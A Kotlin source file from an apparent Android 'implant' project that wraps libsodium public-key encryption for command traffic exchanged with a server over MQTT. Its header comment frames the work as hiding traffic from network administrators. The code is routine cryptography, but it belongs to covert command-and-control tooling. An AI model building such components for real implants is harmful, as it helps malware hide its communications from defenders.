/*
* This class provides encryption using the libsodium library.
* It encrypts all command responses before they go out on the wire and decrypt messages
* sent from the server.
* This should not be used as the only layer of protection for traffic, since MQTT traffic with
* encrypted payloads will probably be suspicious to an observant Network Administrator, and I
* probably made a mistake somewhere that will lead to the data being easily decrypted by a real
* cryptographer.
* ALL traffic should still be sent over SSL.
* */
package com.cooperthecoder.implant.crypto

import android.util.Base64
import org.libsodium.jni.Sodium
import org.libsodium.jni.keys.KeyPair
import javax.security.auth.Destroyable

class NetworkEncryption(val serverPublicKey: ByteArray, val clientPrivateKey: ByteArray) : Destroyable {

    open class CryptoException(e: String) : Exception(e)
    class DecryptionException(e: String) : CryptoException(e)
    class EncryptionException(e: String) : CryptoException(e)

    constructor(serverPublicKey: String, clientPrivateKey: String) : this(
            Base64.decode(serverPublicKey, Base64.DEFAULT),
            Base64.decode(clientPrivateKey, Base64.DEFAULT)
    )

    companion object {
        private val nonceSize = Sodium.crypto_box_noncebytes()
        private const val SEED_SIZE = 32

        fun newKeyPair(): KeyPair {
            val seed = ByteArray(SEED_SIZE)
            Sodium.randombytes(seed, seed.size)
            return KeyPair(seed)
        }
    }

    override fun isDestroyed(): Boolean {
        return clientPrivateKey.none { it != 0x00.toByte() }
    }

    override fun destroy() {
        clientPrivateKey.fill(0x00)
    }

    fun encrypt(plaintext: String): String {
        val ciphertext = encrypt(plaintext.toByteArray())
        val encoded = Base64.encodeToString(ciphertext, Base64.DEFAULT)
        return encoded
    }

    fun decrypt(nonceAndCiphertext: String): String {
        val ciphertextBytes = Base64.decode(nonceAndCiphertext, Base64.DEFAULT)
        val plaintext = decrypt(ciphertextBytes)
        return String(plaintext)
    }

    fun encrypt(plaintext: ByteArray): ByteArray {
        val ciphertext = ByteArray(ciphertextLength(plaintext))
        val nonce = nonce()
        val result = Sodium.crypto_box_easy(
                ciphertext,
                plaintext,
                plaintext.size,
                nonce,
                serverPublicKey,
                clientPrivateKey
        )
        if (result != 0) {
            throw EncryptionException("Error encrypting message. Libsodium result code: $result")
        }
        return nonce.plus(ciphertext)
    }

    fun decrypt(nonceAndCiphertext: ByteArray): ByteArray {
        val plaintext = ByteArray(plaintextLength(nonceAndCiphertext))
        val nonce = nonce(nonceAndCiphertext)
        val ciphertext = nonceAndCiphertext.copyOfRange(nonce.size, nonceAndCiphertext.size)
        val result = Sodium.crypto_box_open_easy(
                plaintext,
                ciphertext,
                ciphertext.size,
                nonce,
                serverPublicKey,
                clientPrivateKey
        )

        if (result != 0) {
            throw DecryptionException("Error decrypting message. Libsodium result code: $result")
        }
        return plaintext
    }

    private fun nonce(ciphertext: ByteArray? = null): ByteArray {
        if (ciphertext == null) {
            val nonce = ByteArray(nonceSize)
            Sodium.randombytes(nonce, nonce.size)
            return nonce
        }
        return ciphertext.copyOf(nonceSize)
    }

    private fun ciphertextLength(plaintext: ByteArray): Int = Sodium.crypto_box_macbytes() + plaintext.size

    private fun plaintextLength(ciphertext: ByteArray): Int = ciphertext.size - nonceSize - Sodium.crypto_box_macbytes()
}
